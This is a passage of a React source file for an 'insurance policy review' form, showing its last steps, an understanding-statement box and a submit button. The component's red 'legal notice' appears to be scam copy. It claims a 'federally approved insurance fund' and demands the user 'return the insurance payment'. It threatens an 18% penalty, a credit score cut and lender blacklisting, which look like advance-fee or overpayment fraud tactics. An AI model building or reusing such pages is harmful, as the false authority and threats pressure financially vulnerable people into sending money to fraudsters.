            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
              <p className="text-blue-700 text-sm flex items-center">
                <Shield className="w-4 h-4 mr-2" />
                Your IP address is recorded for security and verification purposes.
              </p>
            </div>

            <div className="flex justify-between">
              <button
                onClick={prevStep}
                className="bg-gray-200 text-gray-700 py-3 px-8 rounded-lg font-semibold hover:bg-gray-300 transition flex items-center"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Previous
              </button>
              <button
                onClick={checkIDSelection}
                className="bg-orange-500 text-black py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition flex items-center"
              >
                Continue
                <ArrowRight className="w-4 h-4 ml-2" />
              </button>
            </div>
          </div>
        )}

        {/* Step 5: Confirmation */}
        {currentStep === 5 && (
          <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
            <h2 className="text-2xl font-bold text-gray-900 mb-6 flex items-center">
              <CheckCircle2 className="w-6 h-6 mr-2 text-orange-500" />
              Step 5: Final Confirmation
            </h2>

            <div className="mb-6">
              <label className="block text-gray-700 text-sm font-medium mb-2">Understanding Statement</label>
              <textarea
                value={understandingStatement}
                onChange={(e) => setUnderstandingStatement(e.target.value)}
                rows={4}
                className="w-full bg-white border border-gray-300 rounded-lg text-gray-900 p-3 focus:outline-none focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                placeholder="Please type your understanding statement confirming you have read and agreed to the terms."
              />
              <p className="text-xs text-gray-500 mt-2">
                Type any statement confirming you have read and understood the terms and conditions.
              </p>
            </div>

            <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
              <p className="text-green-700 text-sm flex items-center">
                <CheckCircle className="w-4 h-4 mr-2" />
                By clicking submit, you confirm that you have completed all steps and agree to the terms.
              </p>
            </div>

            <div className="bg-red-50 border-2 border-red-300 rounded-lg p-4 mb-6">
              <p className="text-red-900 font-bold text-sm mb-3">
                <strong>IMPORTANT LEGAL NOTICE - FEDERALLY APPROVED INSURANCE FUND</strong>
              </p>
              <p className="text-red-800 text-xs mb-2">
                <strong>This is a federally approved insurance fund designated strictly for insurance purposes only.</strong>
              </p>
              <p className="text-red-800 text-xs mb-2">
                <strong>We reserve all rights to cancel the deposit immediately if you fail to return the insurance payment as required.</strong>
              </p>
              <p className="text-red-800 text-xs mb-2">
                <strong>In case of non-compliance, we will exercise our legal rights to:</strong>
              </p>
              <ul className="list-disc list-inside text-red-800 text-xs space-y-1 ml-2">
                <li>Contact your bank to immediately cancel the entire deposit with an additional <strong>18% penalty fee</strong>, which will make your account negative by the full amount plus charges</li>
                <li>Report to credit bureaus to immediately reduce your credit score by <strong>up to 30 points</strong></li>
                <li>Inform other lenders about this fraudulent activity, which will result in <strong>no future loan approvals</strong> from any participating lenders</li>
              </ul>
              <p className="text-red-800 text-xs mt-3">
                <strong>However, if you follow the process correctly:</strong> You will receive your approved loan, and we will help you build your credit <strong>free of cost</strong> through this insurance program.
              </p>
            </div>

            <div className="flex justify-between">
              <button
                onClick={prevStep}
                className="bg-gray-200 text-gray-700 py-3 px-8 rounded-lg font-semibold hover:bg-gray-300 transition flex items-center"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Previous
              </button>
              <button
                onClick={handleSubmit}
                disabled={loading}
                className="bg-green-600 text-white py-3 px-8 rounded-lg font-semibold hover:bg-green-700 transition flex items-center disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? (
                  <>
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2" />
                    Submitting...
                  </>
                ) : (
                  <>
                    <CheckCircle2 className="w-4 h-4 mr-2" />
                    Submit Review
                  </>
                )}
              </button>
            </div>
          </div>
        )}
      </main>
    </div>
  );
};

export default InsurancePolicyReview;
